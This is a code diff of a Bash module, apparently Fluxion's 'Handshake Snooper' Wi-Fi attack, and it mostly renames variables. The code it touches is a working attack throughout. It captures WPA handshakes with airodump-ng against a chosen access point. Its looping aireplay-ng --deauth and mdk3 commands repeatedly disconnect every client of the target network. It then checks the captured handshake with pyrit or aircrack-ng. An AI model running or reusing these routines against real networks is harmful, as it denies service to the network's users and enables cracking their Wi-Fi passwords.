@@ -28,7 +28,7 @@ handshake_snooper_arbiter_daemon() {
   # NOTE: The line below must remain before trap to prevent race conditions.
   local handshake_snooper_arbiter_daemon_state="running"
 
-  function handshake_snooper_arbiter_daemon_abort() {
+  handshake_snooper_arbiter_daemon_abort() {
     handshake_snooper_arbiter_daemon_state="aborted"
     if [ "$handshake_snooper_arbiter_daemon_viewerPID" ]; then
       kill $handshake_snooper_arbiter_daemon_viewerPID
@@ -71,11 +71,11 @@ handshake_snooper_arbiter_daemon() {
     now=$(env -i date '+%H:%M:%S')
     echo -e "[$now] $(io_dynamic_output $HandshakeSnooperSnoopingForNSecondsNotice)" >> \
       "$FLUXIONWorkspacePath/handshake_snooper.log"
-    sleep $HANDSHAKEVerifierInterval &
+    sleep $HandshakeSnooperVerifierInterval &
     wait $! # Using wait to asynchronously catch flags while waiting.
 
     # If synchronously searching, stop the captor and deauthenticator before checking.
-    if [ "$HANDSHAKEVerifierSynchronicity" = "blocking" ]; then
+    if [ "$HandshakeSnooperVerifierSynchronicity" = "blocking" ]; then
       now=$(env -i date '+%H:%M:%S')
       echo -e "[$now] $HandshakeSnooperStoppingForVerifierNotice" >> \
         "$FLUXIONWorkspacePath/handshake_snooper.log"
@@ -92,13 +92,13 @@ handshake_snooper_arbiter_daemon() {
     now=$(env -i date '+%H:%M:%S')
     echo -e "[$now] $HandshakeSnooperSearchingForHashesNotice" >> \
       "$FLUXIONWorkspacePath/handshake_snooper.log"
-    hash_check_handshake "$HANDSHAKEVerifierIdentifier" \
+    hash_check_handshake "$HandshakeSnooperVerifierIdentifier" \
       "$FLUXIONWorkspacePath/capture/recent.cap" \
       "$FluxionTargetSSID" "$FluxionTargetMAC"
     handshake_snooper_arbiter_daemon_verified=$?
 
     # If synchronously searching, restart the captor and deauthenticator after checking.
-    if [ "$HANDSHAKEVerifierSynchronicity" = "blocking" -a \
+    if [ "$HandshakeSnooperVerifierSynchronicity" = "blocking" -a \
       $handshake_snooper_arbiter_daemon_verified -ne 0 ]; then
       sandbox_remove_workfile "$FLUXIONWorkspacePath/capture/*"
 
@@ -129,15 +129,15 @@ handshake_snooper_arbiter_daemon() {
 }
 
 handshake_snooper_stop_captor() {
-  if [ "$HANDSHAKECaptorPID" ]; then
-    kill -s SIGINT $HANDSHAKECaptorPID &> $FLUXIONOutputDevice
+  if [ "$HandshakeSnooperCaptorPID" ]; then
+    kill -s SIGINT $HandshakeSnooperCaptorPID &> $FLUXIONOutputDevice
   fi
 
-  HANDSHAKECaptorPID=""
+  HandshakeSnooperCaptorPID=""
 }
 
 handshake_snooper_start_captor() {
-  if [ "$HANDSHAKECaptorPID" ]; then return 0; fi
+  if [ "$HandshakeSnooperCaptorPID" ]; then return 0; fi
   if [ "$HandshakeSnooperState" != "Running" ]; then return 1; fi
 
   handshake_snooper_stop_captor
@@ -147,57 +147,58 @@ handshake_snooper_start_captor() {
     airodump-ng --ignore-negative-one -d $FluxionTargetMAC -w "$FLUXIONWorkspacePath/capture/dump" -c $FluxionTargetChannel -a $HandshakeSnooperJammerInterface &
   local parentPID=$!
 
-  while [ ! "$HANDSHAKECaptorPID" ]; do
+  while [ ! "$HandshakeSnooperCaptorPID" ]; do
     sleep 1 &
     wait $!
-    HANDSHAKECaptorPID=$(pgrep -P $parentPID)
+    HandshakeSnooperCaptorPID=$(pgrep -P $parentPID)
   done
 }
 
 handshake_snooper_stop_deauthenticator() {
-  if [ "$HANDSHAKEDeauthenticatorPID" ]; then kill $HANDSHAKEDeauthenticatorPID &>$FLUXIONOutputDevice
+  if [ "$HandshakeSnooperDeauthenticatorPID" ]; then
+    kill $HandshakeSnooperDeauthenticatorPID &> $FLUXIONOutputDevice
   fi
 
-  HANDSHAKEDeauthenticatorPID=""
+  HandshakeSnooperDeauthenticatorPID=""
 }
 
 handshake_snooper_start_deauthenticator() {
-  if [ "$HANDSHAKEDeauthenticatorPID" ]; then return 0; fi
+  if [ "$HandshakeSnooperDeauthenticatorPID" ]; then return 0; fi
   if [ "$HandshakeSnooperState" != "Running" ]; then return 1; fi
 
   handshake_snooper_stop_deauthenticator
 
   # Prepare deauthenticators
-  case "$HANDSHAKEDeauthenticatorIdentifier" in
+  case "$HandshakeSnooperDeauthenticatorIdentifier" in
     "$HandshakeSnooperMdk3MethodOption")
       echo "$FluxionTargetMAC" > $FLUXIONWorkspacePath/mdk3_blacklist.lst ;;
   esac
 
   # Start deauthenticators.
-  case "$HANDSHAKEDeauthenticatorIdentifier" in
+  case "$HandshakeSnooperDeauthenticatorIdentifier" in
     "$HandshakeSnooperAireplayMethodOption")
       xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
         -title "Deauthenticating all clients on $FluxionTargetSSID" -e \
         "while true; do sleep 7; timeout 3 aireplay-ng --deauth=100 -a $FluxionTargetMAC --ignore-negative-one $HandshakeSnooperJammerInterface; done" &
-      HANDSHAKEDeauthenticatorPID=$!
+      HandshakeSnooperDeauthenticatorPID=$!
     ;;
     "$HandshakeSnooperMdk3MethodOption")
       xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
         -title "Deauthenticating all clients on $FluxionTargetSSID" -e \
         "while true; do sleep 7; timeout 3 mdk3 $HandshakeSnooperJammerInterface d -b $FLUXIONWorkspacePath/mdk3_blacklist.lst -c $FluxionTargetChannel; done" &
-      HANDSHAKEDeauthenticatorPID=$!
+      HandshakeSnooperDeauthenticatorPID=$!
     ;;
   esac
 }
 
 
 handshake_snooper_unset_deauthenticator_identifier() {
-  if [ ! "$HANDSHAKEDeauthenticatorIdentifier" ]; then return 1; fi
-  HANDSHAKEDeauthenticatorIdentifier=""
+  if [ ! "$HandshakeSnooperDeauthenticatorIdentifier" ]; then return 1; fi
+  HandshakeSnooperDeauthenticatorIdentifier=""
 }
 
 handshake_snooper_set_deauthenticator_identifier() {
-  if [ "$HANDSHAKEDeauthenticatorIdentifier" ]; then return 0; fi
+  if [ "$HandshakeSnooperDeauthenticatorIdentifier" ]; then return 0; fi
 
   handshake_snooper_unset_deauthenticator_identifier
 
@@ -209,11 +210,11 @@ handshake_snooper_set_deauthenticator_identifier() {
   )
   io_query_choice "$HandshakeSnooperMethodQuery" methods[@]
 
-  HANDSHAKEDeauthenticatorIdentifier=$IOQueryChoice
+  HandshakeSnooperDeauthenticatorIdentifier=$IOQueryChoice
 
   echo
 
-  if [ "$HANDSHAKEDeauthenticatorIdentifier" = \
+  if [ "$HandshakeSnooperDeauthenticatorIdentifier" = \
     "$FLUXIONGeneralBackOption" ]; then
     handshake_snooper_unset_deauthenticator_identifier
     return 1
@@ -234,7 +235,7 @@ handshake_snooper_unset_jammer_interface() {
 
 handshake_snooper_set_jammer_interface() {
   if [ "$HandshakeSnooperJammerInterface" ]; then return 0; fi
-  #if [ "$HANDSHAKEDeauthenticatorIdentifier" = \
+  #if [ "$HandshakeSnooperDeauthenticatorIdentifier" = \
   #  "$HandshakeSnooperMonitorMethodOption" ]; then return 0; fi
 
   if [ ! "$HandshakeSnooperUninitializedJammerInterface" ]; then
@@ -260,12 +261,12 @@ handshake_snooper_set_jammer_interface() {
 }
 
 handshake_snooper_unset_verifier_identifier() {
-  if [ ! "$HANDSHAKEVerifierIdentifier" ]; then return 1; fi
-  HANDSHAKEVerifierIdentifier=""
+  if [ ! "$HandshakeSnooperVerifierIdentifier" ]; then return 1; fi
+  HandshakeSnooperVerifierIdentifier=""
 }
 
 handshake_snooper_set_verifier_identifier() {
-  if [ "$HANDSHAKEVerifierIdentifier" ]; then return 0; fi
+  if [ "$HandshakeSnooperVerifierIdentifier" ]; then return 0; fi
 
   handshake_snooper_unset_verifier_identifier
 
@@ -280,9 +281,9 @@ handshake_snooper_set_verifier_identifier() {
 
   case "$IOQueryChoice" in
     "$FLUXIONHashVerificationMethodPyritOption")
-      HANDSHAKEVerifierIdentifier="pyrit" ;;
+      HandshakeSnooperVerifierIdentifier="pyrit" ;;
     "$FLUXIONHashVerificationMethodAircrackOption")
-      HANDSHAKEVerifierIdentifier="aircrack-ng" ;;
+      HandshakeSnooperVerifierIdentifier="aircrack-ng" ;;
     "$FLUXIONGeneralBackOption")
       handshake_snooper_unset_verifier_identifier
       return 1
@@ -291,12 +292,12 @@ handshake_snooper_set_verifier_identifier() {
 }
 
 handshake_snooper_unset_verifier_interval() {
-  if [ ! "$HANDSHAKEVerifierInterval" ]; then return 1; fi
-  HANDSHAKEVerifierInterval=""
+  if [ ! "$HandshakeSnooperVerifierInterval" ]; then return 1; fi
+  HandshakeSnooperVerifierInterval=""
 }
 
 handshake_snooper_set_verifier_interval() {
-  if [ "$HANDSHAKEVerifierInterval" ]; then return 0; fi
+  if [ "$HandshakeSnooperVerifierInterval" ]; then return 0; fi
 
   handshake_snooper_unset_verifier_interval
 
@@ -305,11 +306,11 @@ handshake_snooper_set_verifier_interval() {
 
   case "$IOQueryChoice" in
     "$HandshakeSnooperVerifierInterval30SOption")
-      HANDSHAKEVerifierInterval=30 ;;
+      HandshakeSnooperVerifierInterval=30 ;;
     "$HandshakeSnooperVerifierInterval60SOption")
-      HANDSHAKEVerifierInterval=60 ;;
+      HandshakeSnooperVerifierInterval=60 ;;
     "$HandshakeSnooperVerifierInterval90SOption")
-      HANDSHAKEVerifierInterval=90 ;;
+      HandshakeSnooperVerifierInterval=90 ;;
     "$FLUXIONGeneralBackOption")
       handshake_snooper_unset_verifier_interval
       return 1
@@ -318,12 +319,12 @@ handshake_snooper_set_verifier_interval() {
 }
 
 handshake_snooper_unset_verifier_synchronicity() {
-  if [ ! "$HANDSHAKEVerifierSynchronicity" ]; then return 1; fi
-  HANDSHAKEVerifierSynchronicity=""
+  if [ ! "$HandshakeSnooperVerifierSynchronicity" ]; then return 1; fi
+  HandshakeSnooperVerifierSynchronicity=""
 }
 
 handshake_snooper_set_verifier_synchronicity() {
-  if [ "$HANDSHAKEVerifierSynchronicity" ]; then return 0; fi
+  if [ "$HandshakeSnooperVerifierSynchronicity" ]; then return 0; fi
 
   handshake_snooper_unset_verifier_synchronicity
 
@@ -337,9 +338,9 @@ handshake_snooper_set_verifier_synchronicity() {
 
   case "$IOQueryChoice" in
     "$HandshakeSnooperVerifierSynchronicityAsynchronousOption")
-      HANDSHAKEVerifierSynchronicity="non-blocking" ;;
+      HandshakeSnooperVerifierSynchronicity="non-blocking" ;;
     "$HandshakeSnooperVerifierSynchronicitySynchronousOption")
-      HANDSHAKEVerifierSynchronicity="blocking" ;;
+      HandshakeSnooperVerifierSynchronicity="blocking" ;;
     "$FLUXIONGeneralBackOption")
       handshake_snooper_unset_verifier_synchronicity
       return 1
@@ -432,11 +433,11 @@ prep_attack() {
 }
 
 stop_attack() {
-  if [ "$HANDSHAKEArbiterPID" ]; then
-    kill -s SIGABRT $HANDSHAKEArbiterPID &> $FLUXIONOutputDevice
+  if [ "$HandshakeSnooperArbiterPID" ]; then
+    kill -s SIGABRT $HandshakeSnooperArbiterPID &> $FLUXIONOutputDevice
   fi
 
-  HANDSHAKEArbiterPID=""
+  HandshakeSnooperArbiterPID=""
 
   HandshakeSnooperState="Stopped"
 }
@@ -447,7 +448,7 @@ start_attack() {
   HandshakeSnooperState="Running"
 
   handshake_snooper_arbiter_daemon $$ &> $FLUXIONOutputDevice &
-  HANDSHAKEArbiterPID=$!
+  HandshakeSnooperArbiterPID=$!
 }
 
 # FLUXSCRIPT END
